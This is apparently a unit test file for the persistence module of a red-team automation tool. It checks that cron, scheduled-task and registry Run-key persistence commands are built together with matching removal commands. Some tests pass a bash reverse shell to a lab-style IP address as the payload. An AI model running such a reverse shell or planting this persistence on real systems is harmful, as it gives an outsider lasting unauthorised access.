# tests/unit/tools/test_persistence.py
from autored.tools.persistence import (
    _build_cron_modify, _build_schtasks_create, _build_reg_modify,
    _removal_cron, _removal_schtasks, _removal_reg,
)


def test_build_cron_modify():
    cmd, removal = _build_cron_modify("@reboot", "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1")
    assert "crontab" in cmd
    assert "@reboot" in cmd
    assert "crontab" in removal  # removal command


def test_build_schtasks_create():
    cmd, removal = _build_schtasks_create("AutoRedPersist", "powershell -enc abc123", "ONLOGON")
    assert "schtasks" in cmd
    assert "/create" in cmd
    assert "AutoRedPersist" in cmd
    assert "schtasks" in removal
    assert "/delete" in removal


def test_build_reg_modify():
    cmd, removal = _build_reg_modify("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "AutoRed", "powershell -enc abc123")
    assert "reg" in cmd
    assert "add" in cmd
    assert "reg" in removal
    assert "delete" in removal


def test_removal_cron_nonempty():
    """Review Focus: every persistence method must produce a removal command."""
    assert _removal_cron("bash -i >& /dev/tcp/10.10.14.5/4444 0>&1")
    assert "crontab" in _removal_cron("test")


def test_removal_schtasks_nonempty():
    assert _removal_schtasks("AutoRedPersist")
    assert "/delete" in _removal_schtasks("test")


def test_removal_reg_nonempty():
    assert _removal_reg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "AutoRed")
    assert "delete" in _removal_reg("test", "test")
